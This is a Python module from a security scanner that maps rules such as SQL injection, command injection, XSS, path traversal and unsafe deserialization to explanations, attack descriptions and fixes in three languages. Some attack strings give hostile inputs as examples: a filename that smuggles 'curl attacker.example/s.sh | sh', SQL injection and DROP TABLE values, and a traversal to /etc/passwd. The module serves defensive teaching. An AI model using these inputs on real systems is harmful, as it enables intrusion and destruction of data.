"""Explanation templates, one per rule. Each has four parts: what was found, why
it is dangerous, a concrete attack, and a fix that is code we wrote and tested."""
from __future__ import annotations

import dataclasses
import json
from functools import lru_cache

from ..config import DATA_DIR, get_settings
from ..models import Finding, Language


@lru_cache(maxsize=1)
def cwe_data() -> dict:
    path = DATA_DIR / "grounding" / "cwe.json"
    return json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}


@lru_cache(maxsize=1)
def owasp_data() -> dict:
    path = DATA_DIR / "grounding" / "owasp.json"
    return json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}


@lru_cache(maxsize=1)
def nist_data() -> dict:
    path = DATA_DIR / "grounding" / "nist.json"
    return json.loads(path.read_text(encoding="utf-8")) if path.exists() else {}


def nist_block(rule_id: str) -> str:
    """NIST SP 800-53 control this class relates to.

    Deliberately worded as 'relates to'. SP 800-53 controls are organisational;
    one line of code is evidence toward a control, never satisfaction of one,
    and claiming otherwise is the kind of thing a compliance judge catches.
    """
    entry = nist_data().get(rule_id)
    if not entry:
        return ""
    return (f"\n\nRelates to NIST SP 800-53 {entry['control']} ({entry['title']}): "
            f"{entry['summary']}")


# NIST control text is long and organisational, so it is opt-in per run rather
# than a config file setting. `cs scan --nist` flips it; nothing else reads it.
_INCLUDE_NIST = False


def set_nist(enabled: bool) -> None:
    global _INCLUDE_NIST
    _INCLUDE_NIST = enabled


def grounding_block(finding: Finding, include_nist: bool | None = None) -> str:
    """Citations, verbatim, so fidelity can be diffed against the source."""
    parts = []
    if cwe := cwe_data().get(finding.cwe):
        parts.append(f"{finding.cwe} ({cwe['name']}): {cwe['summary']}")
    key = finding.owasp.split(" ")[0].strip(" -").strip()
    if owasp := owasp_data().get(key):
        parts.append(f"{key} ({owasp['name']}): {owasp['summary']}")
    block = ("\n\n" + "\n\n".join(parts)) if parts else ""
    want = _INCLUDE_NIST if include_nist is None else include_nist
    if want or get_settings().show_nist:
        block += nist_block(finding.rule_id)
    return block


# ------------------------------------------------------------- the templates

TEMPLATES: dict[str, dict[str, str]] = {
    "CS001": {
        "why": (
            "A credential written into source code is readable by anyone who can read the "
            "repository - and that includes its entire git history, your CI build logs, and "
            "anything you deploy. Removing the line later does not remove it from history."
        ),
        "attack": (
            "Automated scanners crawl public repositories for key patterns continuously. A "
            "leaked cloud key is typically used within minutes of being pushed: the finder "
            "enumerates your storage buckets and compute, then either exfiltrates data or "
            "starts instances you pay for."
        ),
        "fix_python": (
            "import os\n"
            "AWS_ACCESS_KEY = os.environ[\"AWS_ACCESS_KEY_ID\"]   # fails loudly if unset\n\n"
            "# then, outside the code:\n"
            "#   1. revoke the exposed key in the provider console - it is already public\n"
            "#   2. put the new value in .env, and add .env to .gitignore\n"
            "#   3. purge it from history (git filter-repo) if the repo was ever pushed"
        ),
        "fix_javascript": (
            "const AWS_ACCESS_KEY = process.env.AWS_ACCESS_KEY_ID;\n"
            "if (!AWS_ACCESS_KEY) throw new Error('AWS_ACCESS_KEY_ID is not set');\n\n"
            "// then: revoke the exposed key, add .env to .gitignore, purge git history"
        ),
    },
    "CS002": {
        "why": (
            "When a query is assembled by joining strings, the database cannot tell your SQL "
            "apart from a value someone typed. A parameterised query sends the statement and "
            "the values separately, so a value can never become syntax."
        ),
        "attack": (
            "Supplying 1 OR 1=1 where an id is expected returns every row in the table. "
            "Supplying 1; DROP TABLE users-- ends the intended statement and starts a new one. "
            "Neither requires any tooling - they are typed into the address bar."
        ),
        "fix_python": (
            "# parameterised - the driver escapes and binds the value\n"
            "cur.execute(\"SELECT * FROM users WHERE id = ?\", (uid,))\n\n"
            "# SQLAlchemy text() with bound parameters\n"
            "session.execute(text(\"SELECT * FROM users WHERE id = :uid\"), {\"uid\": uid})"
        ),
        "fix_javascript": (
            "// parameterised query - never a template literal\n"
            "db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);\n\n"
            "// postgres\n"
            "client.query('SELECT * FROM users WHERE id = $1', [req.params.id]);"
        ),
    },
    "CS003": {
        "why": (
            "Passing a constructed string to a shell means the shell interprets it. Characters "
            "like ; | && $() are syntax to the shell, so any value spliced into that string can "
            "add commands of its own."
        ),
        "attack": (
            "A filename parameter of report.pdf; curl attacker.example/s.sh | sh runs your "
            "intended command and then the attacker's, with your process's privileges."
        ),
        "fix_python": (
            "import subprocess\n"
            "# pass a list, never a string; shell=False is the default\n"
            "subprocess.run([\"convert\", filename, \"out.png\"], check=True)\n\n"
            "# if a shell is genuinely required, quote every interpolated value:\n"
            "#   import shlex; shlex.quote(filename)"
        ),
        "fix_javascript": (
            "const { execFile } = require('node:child_process');\n"
            "// execFile takes an argument array - no shell parsing happens\n"
            "execFile('convert', [filename, 'out.png'], (err, stdout) => { /* ... */ });"
        ),
    },
    "CS004": {
        "why": (
            "MD5 and SHA-1 are broken: an attacker can construct two different inputs with the "
            "same hash, cheaply. They are also fast, which makes brute-forcing a stolen password "
            "hash easy. Neither is acceptable for passwords, signatures, or integrity checks."
        ),
        "attack": (
            "A leaked table of MD5 password hashes is not really a table of hashes - commodity "
            "hardware reverses common passwords at billions of guesses per second, and the "
            "rest are looked up in precomputed tables."
        ),
        "fix_python": (
            "# integrity / general hashing\n"
            "import hashlib\n"
            "digest = hashlib.sha256(data).hexdigest()\n\n"
            "# passwords - never a plain hash; use a slow KDF\n"
            "from argon2 import PasswordHasher\n"
            "hashed = PasswordHasher().hash(password)"
        ),
        "fix_javascript": (
            "const crypto = require('node:crypto');\n"
            "const digest = crypto.createHash('sha256').update(data).digest('hex');\n\n"
            "// passwords\n"
            "const bcrypt = require('bcrypt');\n"
            "const hashed = await bcrypt.hash(password, 12);"
        ),
    },
    "CS005": {
        "why": (
            "The route reads data using a value the client controls, and nothing establishes who "
            "the client is. Authentication answers 'who are you'; without it there is no basis "
            "for the next question, 'is this record yours'. Changing a number in the URL is the "
            "entire attack."
        ),
        "attack": (
            "A user requests /user/1 and receives their own record, then requests /user/2 and "
            "receives someone else's. A short loop over the id range dumps the table. No "
            "credentials are needed and nothing in your logs looks unusual."
        ),
        "fix_python": (
            "from flask_login import login_required, current_user\n\n"
            "@app.route(\"/user/<uid>\")\n"
            "@login_required                       # 1. establish who is asking\n"
            "def get_user(uid):\n"
            "    row = session.execute(\n"
            "        text(\"SELECT * FROM users WHERE id = :uid AND owner_id = :owner\"),\n"
            "        {\"uid\": uid, \"owner\": current_user.id},   # 2. constrain to them\n"
            "    ).first()\n"
            "    return {\"row\": dict(row) if row else None}, (200 if row else 404)"
        ),
        "fix_javascript": (
            "app.get('/user/:id', requireAuth, async (req, res) => {   // 1. who is asking\n"
            "  const [row] = await db.query(\n"
            "    'SELECT * FROM users WHERE id = ? AND owner_id = ?',\n"
            "    [req.params.id, req.user.id]                          // 2. constrain to them\n"
            "  );\n"
            "  return row ? res.json(row) : res.sendStatus(404);\n"
            "});"
        ),
    },
    "CS006": {
        "why": (
            "AI assistants invent package names that sound plausible and do not exist. Attackers "
            "watch for those names and register them, so the install command the assistant gave "
            "you fetches their code and runs it with your permissions."
        ),
        "attack": (
            "A researcher published an empty package under a name models commonly hallucinate. "
            "It was downloaded roughly 30,000 times in three months by developers running an "
            "AI-suggested install command. A real attacker would not have left it empty."
        ),
        "fix_python": (
            "# Do not install it. Confirm the name from the library's own documentation.\n"
            "# Then pin the version you verified:\n"
            "#   requests==2.32.3\n"
            "# An unpinned requirement resolves to whatever exists at install time."
        ),
        "fix_javascript": (
            "// Do not install it. Confirm the name on the package's own docs or repo.\n"
            "// Then pin an exact version in package.json - \"^1.2.0\" is not a pin.\n"
            "//   \"express\": \"4.21.2\""
        ),
    },
}


# ------------------------------- CS007-CS013, added in the extended pass

TEMPLATES.update({
    "CS007": {
        "why": (
            "The value is written into a page without being escaped, so a browser cannot "
            "tell your markup apart from markup someone typed. Anything in that value "
            "that looks like a tag is treated as one - including a script tag."
        ),
        "attack": (
            "A comment or profile field containing a script tag runs in the browser of "
            "every other user who views the page, with their session. Their cookies, "
            "their logged-in requests, their account."
        ),
        "fix_python": (
            "# Let the template engine escape - Jinja autoescapes by default\n"
            "return render_template(\"page.html\", value=user_value)\n\n"
            "# Never build the template itself from input:\n"
            "#   render_template_string(f\"<p>{user_value}</p>\")   <- compiles input\n"
            "# If raw HTML is genuinely required, sanitise first:\n"
            "#   import bleach; safe = bleach.clean(user_value)"
        ),
        "fix_javascript": (
            "// textContent inserts text, never markup\n"
            "el.textContent = userValue;\n\n"
            "// If HTML is genuinely required, sanitise it:\n"
            "import DOMPurify from 'dompurify';\n"
            "el.innerHTML = DOMPurify.sanitize(userValue);\n\n"
            "// React escapes by default - dangerouslySetInnerHTML opts out"
        ),
    },
    "CS008": {
        "why": (
            "The path is assembled from something the client controls, and nothing "
            "removes ../ before it is resolved. The filesystem resolves those segments "
            "faithfully, which takes the read outside the directory you meant."
        ),
        "attack": (
            "Requesting ../../../../etc/passwd, or on Windows ..\\..\\..\\windows\\win.ini, "
            "returns a file that has nothing to do with your application. The same trick "
            "against a write path overwrites configuration."
        ),
        "fix_python": (
            "from pathlib import Path\n"
            "from werkzeug.utils import secure_filename\n\n"
            "BASE = Path(\"/srv/uploads\").resolve()\n"
            "target = (BASE / secure_filename(name)).resolve()\n"
            "if not target.is_relative_to(BASE):        # resolve THEN check\n"
            "    abort(404)\n"
            "return send_file(target)"
        ),
        "fix_javascript": (
            "const path = require('node:path');\n"
            "const BASE = path.resolve('/srv/uploads');\n\n"
            "const target = path.resolve(BASE, path.basename(req.params.name));\n"
            "if (!target.startsWith(BASE + path.sep)) return res.sendStatus(404);\n"
            "res.sendFile(target);"
        ),
    },
    "CS009": {
        "why": (
            "A setting here is at its most permissive value. Wildcards and debug modes "
            "are convenient during development and become an open door in production, "
            "because nothing about the code changes when it is deployed."
        ),
        "attack": (
            "A wildcard CORS policy combined with credentials lets any website make "
            "authenticated requests as your logged-in users and read the responses. "
            "A debug console executes arbitrary code for anyone who can reach an error page."
        ),
        "fix_python": (
            "# name the origins you actually serve\n"
            "app.add_middleware(\n"
            "    CORSMiddleware,\n"
            "    allow_origins=[\"https://app.example.com\"],\n"
            "    allow_credentials=True,\n"
            ")\n\n"
            "# debug never comes from code\n"
            "app.run(debug=os.environ.get(\"FLASK_DEBUG\") == \"1\")"
        ),
        "fix_javascript": (
            "app.use(cors({\n"
            "  origin: ['https://app.example.com'],   // not '*', not true\n"
            "  credentials: true,\n"
            "}));"
        ),
    },

    # ---- advisories: the language is deliberately weaker ----
    "CS010": {
        "why": (
            "State-changing routes are normally protected by a token the browser cannot "
            "forge cross-site. No such protection is visible in this file. It may be "
            "configured elsewhere - this is a prompt to check, not a defect report."
        ),
        "attack": (
            "If protection is genuinely absent, a page on another site can submit a form "
            "to this route using the victim's cookies, and the action succeeds without "
            "them doing anything but visiting."
        ),
        "fix_python": (
            "from flask_wtf.csrf import CSRFProtect\n"
            "CSRFProtect(app)          # then {{ csrf_token() }} in every form\n\n"
            "# For a token API with no cookies, CSRF may not apply at all -\n"
            "# confirm which model you are in before adding anything."
        ),
        "fix_javascript": (
            "const { doubleCsrf } = require('csrf-csrf');\n"
            "app.use(doubleCsrfProtection);\n\n"
            "// Cookie-authenticated routes only. A pure bearer-token API is not\n"
            "// vulnerable to CSRF - check which one you have."
        ),
    },
    "CS011": {
        "why": (
            "Authentication routes are the ones attackers try in bulk. No rate limit is "
            "visible in this file. A reverse proxy or gateway may already be limiting "
            "it - this is a prompt to confirm, not a defect report."
        ),
        "attack": (
            "Without a limit anywhere in the stack, a leaked password list can be tried "
            "against your login endpoint at thousands of attempts per minute, and the "
            "only signal is a busier log."
        ),
        "fix_python": (
            "from flask_limiter import Limiter\n"
            "limiter = Limiter(get_remote_address, app=app)\n\n"
            "@app.route(\"/login\", methods=[\"POST\"])\n"
            "@limiter.limit(\"5 per minute\")\n"
            "def login(): ..."
        ),
        "fix_javascript": (
            "const rateLimit = require('express-rate-limit');\n"
            "app.use('/login', rateLimit({ windowMs: 60_000, max: 5 }));"
        ),
    },
    "CS012": {
        "why": (
            "Request data reaches a sensitive operation in this function, and nothing "
            "between them looks like validation or escaping. We cannot see whether the "
            "value is safe - only that no check is visible on the path."
        ),
        "attack": (
            "What an attacker does depends on the sink. The point of this advisory is "
            "that the path exists and is unguarded, so the specific consequence is "
            "whatever that operation allows."
        ),
        "fix_python": (
            "from pydantic import BaseModel, Field\n\n"
            "class Query(BaseModel):\n"
            "    term: str = Field(max_length=64, pattern=r\"^[\\w\\s-]+$\")\n\n"
            "# validate at the boundary, then pass the typed object inward"
        ),
        "fix_javascript": (
            "const { z } = require('zod');\n"
            "const Query = z.object({ term: z.string().max(64).regex(/^[\\w\\s-]+$/) });\n"
            "const { term } = Query.parse(req.query);   // throws on bad input"
        ),
    },
    "CS013": {
        "why": (
            "The file is checked and then used as two separate operations. Between them "
            "the filesystem can change - another process can delete, create, or replace "
            "the path with a symlink, and your check no longer describes what you open."
        ),
        "attack": (
            "An attacker who can write to the directory replaces the file with a link to "
            "something else in the gap between the two calls. Your code opens the target "
            "of the link with your process's privileges."
        ),
        "fix_python": (
            "# ask forgiveness, not permission - one atomic operation\n"
            "try:\n"
            "    with open(path, \"r\") as fh:\n"
            "        data = fh.read()\n"
            "except FileNotFoundError:\n"
            "    abort(404)\n\n"
            "# for creation, O_EXCL fails if it already exists\n"
            "#   os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)"
        ),
        "fix_javascript": (
            "// one call, handle the error - do not existsSync first\n"
            "fs.readFile(p, 'utf8', (err, data) => {\n"
            "  if (err) return res.sendStatus(404);\n"
            "  res.send(data);\n"
            "});"
        ),
    },
})


def explain(finding: Finding) -> Finding:
    """Attach explanation, attack and fix. Returns a new Finding (they are frozen)."""
    tpl = TEMPLATES.get(finding.rule_id)
    if tpl is None:
        return finding

    evidence = finding.explanation.rstrip().rstrip(".")   # matcher's evidence string
    what = f"On line {finding.line}, {evidence}."

    if finding.language is Language.PYTHON:
        fix_key = "fix_python"
    elif finding.language is Language.JAVA:
        fix_key = "fix_java" if "fix_java" in tpl else "fix_python"
    else:
        fix_key = "fix_javascript"

    return dataclasses.replace(
        finding,
        explanation=what + " " + tpl["why"] + grounding_block(finding),
        attack=tpl["attack"],
        fix=tpl[fix_key],
    )


# ------------------------------- CS014-CS017, added in the second pass

TEMPLATES.update({
    "CS014": {
        "why": (
            "Deserialization does not just read data - it rebuilds objects, which means "
            "running the constructors and hooks the data names. If the bytes came from "
            "outside, the caller chose which of your classes to instantiate and with what."
        ),
        "attack": (
            "A crafted payload names a class already on your classpath whose constructor "
            "or setter does something useful - opening a connection, writing a file, "
            "spawning a process. No memory corruption, no exploit chain: the format is "
            "working as designed, and the design assumed the data was yours."
        ),
        "fix_python": (
            "# Use a format that describes data, not objects\n"
            "import json\n"
            "payload = json.loads(raw)          # JSON cannot name a class\n\n"
            "# If YAML is required, name the safe loader explicitly\n"
            "import yaml\n"
            "payload = yaml.safe_load(raw)      # or yaml.load(raw, Loader=yaml.SafeLoader)\n\n"
            "# If pickle is genuinely required, it must be authenticated:\n"
            "#   sign the bytes with hmac and verify before unpickling,\n"
            "#   and treat the key as you would a signing key."
        ),
        "fix_javascript": (
            "// JSON.parse builds plain objects and functions never survive it\n"
            "const payload = JSON.parse(raw);\n\n"
            "// YAML: pin the schema so the document cannot name types\n"
            "const yaml = require('js-yaml');\n"
            "const doc = yaml.load(raw, { schema: yaml.JSON_SCHEMA });\n\n"
            "// Never node-serialize/unserialize on anything a client sent."
        ),
        "fix_java": (
            "// Prefer a data format: Jackson/Gson into a declared type\n"
            "ObjectMapper mapper = new ObjectMapper();\n"
            "Order order = mapper.readValue(raw, Order.class);   // you name the type\n\n"
            "// If Java serialization is unavoidable, allow-list the classes:\n"
            "ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(\n"
            "    \"com.example.Order;com.example.Item;!*\");\n"
            "in.setObjectInputFilter(filter);\n\n"
            "// SnakeYAML: new Yaml(new SafeConstructor(new LoaderOptions()))"
        ),
    },
    "CS015": {
        "why": (
            "TLS does two things: it encrypts the channel, and it proves who is on the "
            "other end. Turning off certificate validation keeps the encryption and "
            "discards the proof - so the connection is encrypted to whoever answered, "
            "which may not be who you meant."
        ),
        "attack": (
            "Anyone positioned between you and the server - a compromised router, a "
            "hostile access point, a DNS answer someone else supplied - presents their "
            "own certificate. Your client accepts it, decrypts your traffic, reads the "
            "credentials in it, and forwards everything on so nothing looks wrong."
        ),
        "fix_python": (
            "# Leave verification on. It is the default for a reason.\n"
            "requests.get(url)                      # verify=True is the default\n\n"
            "# Internal CA? Point at the bundle rather than switching checks off:\n"
            "requests.get(url, verify=\"/etc/ssl/certs/internal-ca.pem\")\n"
            "#   or set REQUESTS_CA_BUNDLE / SSL_CERT_FILE in the environment\n\n"
            "# Self-signed in dev only: add the cert to a dev-only trust store,\n"
            "# never verify=False, which also ships to production by accident."
        ),
        "fix_javascript": (
            "// Leave it on.\n"
            "const res = await fetch(url);          // validates by default\n\n"
            "// Internal CA - trust the CA, do not stop checking:\n"
            "const https = require('node:https');\n"
            "const agent = new https.Agent({ ca: fs.readFileSync('internal-ca.pem') });\n"
            "await fetch(url, { agent });\n\n"
            "// NODE_TLS_REJECT_UNAUTHORIZED=0 disables this process-wide. Never ship it."
        ),
        "fix_java": (
            "// Do not install a permissive TrustManager. Trust the CA instead:\n"
            "//   keytool -importcert -alias internal -file ca.pem \\\n"
            "//           -keystore internal-truststore.jks\n"
            "// then point the JVM at it:\n"
            "//   -Djavax.net.ssl.trustStore=internal-truststore.jks\n\n"
            "// A checkServerTrusted that neither validates nor throws accepts\n"
            "// every certificate ever issued, including one made a second ago."
        ),
    },
    "CS016": {
        "why": (
            "http:// is unencrypted. Everything in the request and the response - the "
            "URL, the headers, the body, any token or session cookie - travels as "
            "readable text across every network between here and the server."
        ),
        "attack": (
            "Anyone on the path reads it: the coffee-shop wifi, the corporate proxy, "
            "the hosting provider, anyone who has quietly redirected the route. They "
            "can also change the response on its way back, which is how a plain-HTTP "
            "script tag becomes code execution in the page."
        ),
        "fix_python": (
            "BASE_URL = \"https://api.example.com\"      # not http://\n\n"
            "# If the service genuinely has no TLS, that is the bug to fix.\n"
            "# Until then, do not send anything through it you would not publish."
        ),
        "fix_javascript": (
            "const BASE_URL = 'https://api.example.com';   // not http://\n\n"
            "// Browsers block mixed content for exactly this reason - an https page\n"
            "// loading an http script would undo the page's own protection."
        ),
        "fix_java": (
            "private static final String BASE_URL = \"https://api.example.com\";\n\n"
            "// Android: cleartext is blocked by default since API 28. Do not\n"
            "// re-enable it with android:usesCleartextTraffic=\"true\"."
        ),
    },
    "CS017": {
        "why": (
            "A log line is a copy of the value, written somewhere with different rules. "
            "Logs are read by more people than the code, kept longer than the session, "
            "and shipped to systems the security review never covered - so a secret in "
            "a log has quietly left the boundary you designed for it."
        ),
        "attack": (
            "Nobody has to break in. Support staff, an aggregation service, a shared "
            "dashboard, a debug bundle attached to a ticket, or a stack trace on an "
            "error page - each is a normal path to a log, and each now carries the "
            "credential. Rotating it later does not un-read it."
        ),
        "fix_python": (
            "# Log the fact, never the value\n"
            "logger.info(\"auth attempt for user_id=%s outcome=%s\", user_id, outcome)\n\n"
            "# If you need to correlate a token across lines, log a digest:\n"
            "import hashlib\n"
            "logger.debug(\"token fp=%s\", hashlib.sha256(token.encode()).hexdigest()[:12])\n\n"
            "# And add a filter so it cannot happen by accident:\n"
            "#   logging.Filter that redacts known secret-shaped keys"
        ),
        "fix_javascript": (
            "// Log the fact, never the value\n"
            "logger.info({ userId, outcome }, 'auth attempt');\n\n"
            "// pino has redaction built in - use it as a backstop:\n"
            "const logger = require('pino')({\n"
            "  redact: ['password', 'token', 'req.headers.authorization'],\n"
            "});"
        ),
        "fix_java": (
            "// Log the fact, never the value\n"
            "log.info(\"auth attempt userId={} outcome={}\", userId, outcome);\n\n"
            "// Never log the whole request or a credential-bearing object.\n"
            "// Add a Logback/Log4j2 rewrite or converter that masks known keys,\n"
            "// so a future careless line is caught by the pipeline, not by review."
        ),
    },
})


# --- Java fixes for the classes that already had Python and JavaScript ones ---

TEMPLATES["CS001"]["fix_java"] = (
    "// Read it from the environment or a secret manager\n"
    "private static final String DB_PASSWORD = System.getenv(\"DB_PASSWORD\");\n\n"
    "// Spring: @Value(\"${db.password}\") backed by a vault or env, never a\n"
    "// committed application.properties.\n\n"
    "// Then, outside the code: revoke the exposed value, it is already public;\n"
    "// and purge it from git history if the repo was ever pushed."
)
TEMPLATES["CS002"]["fix_java"] = (
    "// PreparedStatement with bound parameters - the value can never become syntax\n"
    "PreparedStatement ps = conn.prepareStatement(\n"
    "    \"SELECT * FROM users WHERE id = ?\");\n"
    "ps.setString(1, id);\n"
    "ResultSet rs = ps.executeQuery();\n\n"
    "// JPA: entityManager.createQuery(\"...where u.id = :id\").setParameter(\"id\", id)"
)
TEMPLATES["CS003"]["fix_java"] = (
    "// Pass an argument array - no shell parses it\n"
    "ProcessBuilder pb = new ProcessBuilder(\"convert\", filename, \"out.png\");\n"
    "pb.redirectErrorStream(true);\n"
    "Process p = pb.start();\n\n"
    "// Runtime.exec(String) splits on whitespace and is easy to get wrong;\n"
    "// Runtime.exec(String[]) or ProcessBuilder is the safe shape."
)
TEMPLATES["CS004"]["fix_java"] = (
    "// Integrity / general hashing\n"
    "MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n\n"
    "// Symmetric encryption - authenticated mode, never ECB\n"
    "Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n\n"
    "// Passwords - a slow KDF, never a plain hash\n"
    "// org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder\n"
    "// or Argon2PasswordEncoder\n\n"
    "// Randomness for tokens\n"
    "SecureRandom rng = new SecureRandom();"
)
TEMPLATES["CS005"]["fix_java"] = (
    "@GetMapping(\"/user/{id}\")\n"
    "@PreAuthorize(\"isAuthenticated()\")            // 1. establish who is asking\n"
    "public ResponseEntity<User> getUser(@PathVariable Long id,\n"
    "                                    Authentication auth) {\n"
    "    return repo.findByIdAndOwner(id, auth.getName())   // 2. constrain to them\n"
    "               .map(ResponseEntity::ok)\n"
    "               .orElseGet(() -> ResponseEntity.notFound().build());\n"
    "}"
)
TEMPLATES["CS008"]["fix_java"] = (
    "Path base = Paths.get(\"/srv/uploads\").toRealPath();\n"
    "Path target = base.resolve(name).normalize();      // normalise THEN check\n"
    "if (!target.startsWith(base)) {\n"
    "    throw new AccessDeniedException(name);\n"
    "}\n"
    "return Files.readAllBytes(target);"
)
